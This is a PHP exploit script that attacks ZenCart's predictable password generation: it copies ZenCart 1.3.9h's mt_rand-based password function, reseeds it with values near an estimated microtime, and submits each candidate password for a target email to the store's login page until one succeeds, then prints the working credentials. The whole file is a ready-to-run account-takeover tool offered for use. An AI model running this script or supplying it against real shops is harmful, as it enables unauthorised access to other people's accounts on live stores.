<?php  

 /*
 This script takes a microtime value, a ZenCart IP address, and a target email. Using the microtime value it produces a random password (in the same manner as ZenCart). It then takes this random password and makes an HTTP post request to see if it is the correct password for the target email. If it is not the correct password it continues to generate passwords close to the seed until it finds the correct password.

 Usage: php5 createPassword.php [ZenCart IP] [target_email] [estimated_seed] [uncertainty_of_estimated_seed]
 */

//Arguments
$IP = $argv[1];
$user_email = $argv[2];
$microtime = $argv[3];
$endpoint = $argv[4];

//zencart default password length
$length = 7;
 
for ($i = 0; $i < $endpoint; $i++)
{
	//try in positive direction
	mt_srand(($microtime+$i)%1000000);
	$password = zen_create_random_value($length);
	$bool = try_password($password, $user_email, $IP);
     if ($bool === true) {
     	echo "\nUse this email:     ".$user_email."\n";
     	echo 'With this password: '.$password."\n";
     	break;
     }
     
     //try in negative direction
     $mod = ($microtime-$i)%1000000;
     if ($mod < 0) $mod += 1000000;
     mt_srand($mod);
     $password = zen_create_random_value($length);
     $bool = try_password($password, $user_email, $IP);
     if ($bool === true) {
     	echo "\nUse this email:     ".$user_email."\n";
     	echo 'With this password: '.$password."\n";
     	break;
     }
     
     if ($i % 50 == 0)
		echo 'Number of trials: '.($i*2)."\n";
}


/*
A function that makes a post request for a given username and password combination.
Source: http://fczaja.blogspot.com/2011/07/php-how-to-send-post-request-with.html
 */
function try_password($password, $user_email, $IP)
{
	// Create map with request parameters
	$params = array ('email_address' => $user_email, 'password' => $password);

	// Build Http query using params
	$query = http_build_query ($params);
 
	// Create Http context details
	$contextData = array (
		'method' => 'POST',
		'header' => "Connection: close\r\n".
			"Content-type: application/x-www-form-urlencoded\r\n".
			"Content-Length: ".strlen($query)."\r\n",
		'content'=> $query );

	// Create context resource for our request
	$context = stream_context_create (array ( 'http' => $contextData ));

	// Read page rendered as result of your POST request
	$result =  file_get_contents (
		'http://'.$IP.'/zencart/index.php?main_page=login&action=process',  // page url
		false,
		$context);
 
	// Server response is now stored in $result variable so you can process it

	$pos = strpos($result,'Congrat');

	if ($pos === false)
		return false;
	else
		return true;
}


/*
This function returns a random password.
Source: ZenCart source code, v1.3.9h
 */
function zen_create_random_value($length, $type = 'mixed') 
{
	if (($type != 'mixed') && ($type != 'chars') && ($type != 'digits'))
		return false;
	$rand_value = '';
	while (strlen($rand_value) < $length) {
		if ($type == 'digits') {
			$char = zen_rand(0,9, $length);
		} else {
			$char = chr(zen_rand(0,255, $length));
		}
		if ($type == 'mixed') {
			if (preg_match('/^[a-z0-9]$/i', $char)) $rand_value  .= $char;
		} elseif ($type == 'chars') {
			if (preg_match('/^[a-z]$/i', $char)) $rand_value .= $char;
		} elseif ($type == 'digits') {
			if (preg_match('/^[0-9]$/', $char)) $rand_value .= $char;
		}
	}
	return $rand_value;
}


/*
This function returns a random integer value.
Source: ZenCart source code, v1.3.9h
 */
function zen_rand($min = null, $max = null, $length) {
	if (isset($min) && isset($max)) {
		if ($min >= $max) {
			return $min;
		} else {
			return mt_rand($min, $max);
		}
	} else {
		return mt_rand();
    }
}
?>
